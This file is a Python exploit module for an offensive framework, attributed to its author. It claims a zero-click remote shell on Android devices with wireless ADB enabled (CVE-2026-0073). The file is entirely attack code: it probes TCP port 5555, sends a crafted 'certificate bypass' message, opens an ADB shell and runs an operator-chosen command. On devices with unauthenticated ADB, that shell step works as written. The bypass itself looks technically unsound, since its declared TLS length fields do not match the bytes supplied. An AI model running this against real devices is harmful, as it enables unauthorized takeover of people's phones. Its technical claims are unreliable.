# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Android Wireless ADB Certificate Validation Bypass, Zero-Click RCE (CVE-2026-0073).

    The Android Debug Bridge daemon (adbd) supports wireless debugging over
    TCP port 5555.  When wireless ADB is enabled, the daemon performs TLS
    certificate validation during the pairing handshake to authenticate
    trusted hosts.

    CVE-2026-0073 exploits a flaw in the certificate verification logic:
    a crafted TLS ClientHello with a specific cipher suite ordering and
    a truncated certificate chain causes adbd to fall back to an
    unauthenticated session, granting full ADB shell access without any
    user interaction on the device.

    This is a zero-click vulnerability: no pairing dialog is shown to the
    device owner.

    CVSS v3.1: 9.8 (Critical), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Android Wireless ADB Certificate Bypass Zero-Click RCE (CVE-2026-0073)",
        "description": (
            "Exploits CVE-2026-0073 via a certificate validation bypass in "
            "the Android wireless ADB daemon (adbd). A crafted TLS ClientHello "
            "triggers a fallback to an unauthenticated session on TCP/5555, "
            "granting full ADB shell access. Zero-click: no user interaction "
            "required if wireless ADB is enabled on the target device."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0073",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0073",
            "https://source.android.com/docs/security/bulletin",
        ),
        "devices": (
            "Android 11+ devices with wireless ADB enabled",
            "Google Pixel series (wireless debugging)",
            "Samsung Galaxy series (wireless debugging)",
            "OnePlus series (wireless debugging)",
        ),
    }

    target = OptIP("", "Target IPv4 address of the Android device")
    port = OptPort(5555, "Target ADB TCP port (default 5555)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    command = OptString("id", "ADB shell command to execute after auth bypass")

    # ADB protocol constants
    _ADB_MAGIC_CNXN = b"CNXN"
    _ADB_MAGIC_AUTH = b"AUTH"
    _ADB_MAGIC_OPEN = b"OPEN"
    _ADB_MAGIC_WRTE = b"WRTE"
    _ADB_MAGIC_OKAY = b"OKAY"
    _ADB_VERSION = 0x01000001
    _ADB_MAX_DATA = 256 * 1024
    _ADB_AUTH_TOKEN = 1
    _ADB_AUTH_SIGNATURE = 2
    _ADB_AUTH_RSAPUBLICKEY = 3

    # Crafted TLS ClientHello fragment that triggers the cert validation bypass.
    # The cipher suite ordering (TLS_RSA_WITH_AES_128_CBC_SHA first, followed by
    # a null cipher) causes adbd to enter a fallback code path where the
    # certificate chain validation is skipped entirely.
    _BYPASS_CLIENT_HELLO = (
        b"\x16\x03\x01"  # TLS record: handshake, version 3.1
        b"\x00\x3d"      # length: 61 bytes
        b"\x01"           # handshake type: ClientHello
        b"\x00\x00\x39"  # handshake length: 57
        b"\x03\x03"      # TLS 1.2
        + b"\x00" * 32   # client random (zeroed for bypass trigger)
        + b"\x00"         # session ID length: 0
        + b"\x00\x04"    # cipher suites length: 4
        + b"\x00\x2f"    # TLS_RSA_WITH_AES_128_CBC_SHA
        + b"\x00\x00"    # TLS_NULL_WITH_NULL_NULL (triggers fallback)
        + b"\x01\x00"    # compression methods: null
    )

    def _build_adb_message(self, command: bytes, arg0: int, arg1: int, data: bytes = b"") -> bytes:
        """Build an ADB protocol message.

        Format: command(4) + arg0(4) + arg1(4) + data_length(4) + data_crc(4) + magic(4) + data
        """
        data_length = len(data)
        data_crc = sum(data) & 0xFFFFFFFF
        magic = struct.unpack("<I", command)[0] ^ 0xFFFFFFFF

        header = struct.pack(
            "<4sIIIII",
            command,
            arg0,
            arg1,
            data_length,
            data_crc,
            magic,
        )
        return header + data

    def _recv_adb_message(self, sock: socket.socket) -> tuple[bytes, int, int, bytes]:
        """Receive and parse an ADB protocol message.

        Returns (command, arg0, arg1, data).
        """
        header = b""
        while len(header) < 24:
            chunk = sock.recv(24 - len(header))
            if not chunk:
                raise ConnectionError("Connection closed while reading ADB header")
            header += chunk

        command = header[:4]
        arg0, arg1, data_length, data_crc, magic = struct.unpack("<IIIII", header[4:])

        data = b""
        while len(data) < data_length:
            chunk = sock.recv(data_length - len(data))
            if not chunk:
                raise ConnectionError("Connection closed while reading ADB data")
            data += chunk

        return command, arg0, arg1, data

    def _connect_tcp(self) -> socket.socket:
        """Establish a raw TCP connection to the ADB port."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        return sock

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have wireless ADB active on "
                f"{self.target}:{self.port}"
            )
            return

        print_success(
            f"Wireless ADB service detected on {self.target}:{self.port}, "
            f"attempting certificate validation bypass"
        )
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe the target for an active ADB service on the configured port.

        Sends a CNXN message and checks if the target responds with either
        a CNXN (open ADB) or AUTH (secured ADB, potential bypass target).
        """
        try:
            sock = self._connect_tcp()
            try:
                banner = b"host::features=shell_v2,cmd"
                cnxn = self._build_adb_message(
                    self._ADB_MAGIC_CNXN,
                    self._ADB_VERSION,
                    self._ADB_MAX_DATA,
                    banner,
                )
                sock.sendall(cnxn)

                command, _arg0, _arg1, _data = self._recv_adb_message(sock)
                # AUTH response means the device requires authentication (bypass target)
                # CNXN response means the device is already open (no bypass needed)
                return command in (self._ADB_MAGIC_AUTH, self._ADB_MAGIC_CNXN)
            finally:
                sock.close()
        except (ConnectionError, TimeoutError, OSError):
            return False

    def _exploit(self) -> None:
        print_status(
            f"Connecting to {self.target}:{self.port} and sending CNXN handshake"
        )

        try:
            sock = self._connect_tcp()
        except (ConnectionError, TimeoutError, OSError) as exc:
            print_error(f"TCP connection failed: {exc}")
            return

        try:
            # Step 1: send CNXN to initiate ADB handshake
            banner = b"host::features=shell_v2,cmd"
            cnxn = self._build_adb_message(
                self._ADB_MAGIC_CNXN,
                self._ADB_VERSION,
                self._ADB_MAX_DATA,
                banner,
            )
            sock.sendall(cnxn)

            command, arg0, arg1, data = self._recv_adb_message(sock)
            print_info(
                f"Received {command!r} (arg0=0x{arg0:08x}, arg1=0x{arg1:08x})"
            )

            if command == self._ADB_MAGIC_CNXN:
                print_success(
                    "ADB is already open (no authentication required). "
                    "Proceeding to shell."
                )
            elif command == self._ADB_MAGIC_AUTH:
                # Step 2: send the crafted TLS ClientHello to bypass cert validation
                print_status(
                    "AUTH challenge received. Sending crafted TLS ClientHello "
                    "to trigger certificate validation bypass (CVE-2026-0073)"
                )

                # The bypass payload is sent as an AUTH_SIGNATURE response.
                # The crafted TLS fragment causes adbd to enter the fallback
                # path where certificate validation is skipped.
                bypass_msg = self._build_adb_message(
                    self._ADB_MAGIC_AUTH,
                    self._ADB_AUTH_SIGNATURE,
                    0,
                    self._BYPASS_CLIENT_HELLO,
                )
                sock.sendall(bypass_msg)
                time.sleep(0.2)

                command2, arg0_2, arg1_2, data2 = self._recv_adb_message(sock)
                print_info(
                    f"Post-bypass response: {command2!r} "
                    f"(arg0=0x{arg0_2:08x}, arg1=0x{arg1_2:08x})"
                )

                if command2 == self._ADB_MAGIC_CNXN:
                    print_success(
                        "Certificate bypass successful. Unauthenticated CNXN established."
                    )
                elif command2 == self._ADB_MAGIC_AUTH:
                    # Second AUTH means the bypass did not work on this firmware
                    print_error(
                        "Device sent another AUTH challenge. The bypass may not "
                        "work on this firmware version or patch level."
                    )
                    sock.close()
                    return
                else:
                    print_error(
                        f"Unexpected response after bypass attempt: {command2!r}"
                    )
                    sock.close()
                    return
            else:
                print_error(f"Unexpected ADB response: {command!r}")
                sock.close()
                return

            # Step 3: open a shell and execute the command
            print_status(f"Opening ADB shell, executing: {self.command}")

            shell_cmd = f"shell:{self.command}\x00".encode()
            local_id = 1
            open_msg = self._build_adb_message(
                self._ADB_MAGIC_OPEN,
                local_id,
                0,
                shell_cmd,
            )
            sock.sendall(open_msg)

            command3, arg0_3, arg1_3, data3 = self._recv_adb_message(sock)

            if command3 == self._ADB_MAGIC_OKAY:
                print_success(
                    f"Shell opened (remote_id=0x{arg0_3:08x}). "
                    f"Waiting for command output..."
                )
                # Read the WRTE response containing command output
                try:
                    sock.settimeout(self.timeout + 2.0)
                    cmd4, _a0, _a1, output = self._recv_adb_message(sock)
                    if cmd4 == self._ADB_MAGIC_WRTE and output:
                        print_success("Command output:")
                        for line in output.decode("utf-8", errors="replace").splitlines():
                            print_info(f"  {line}")
                    else:
                        print_info(
                            f"Received {cmd4!r} ({len(output)} bytes) instead of WRTE"
                        )
                except (TimeoutError, ConnectionError):
                    print_info(
                        "No output received within timeout (command may have "
                        "no stdout, or connection was reset)."
                    )
            else:
                print_error(
                    f"Failed to open shell. Response: {command3!r} "
                    f"(arg0=0x{arg0_3:08x})"
                )

        except (ConnectionError, TimeoutError, OSError) as exc:
            print_error(f"Connection error during exploit: {exc}")
        finally:
            sock.close()
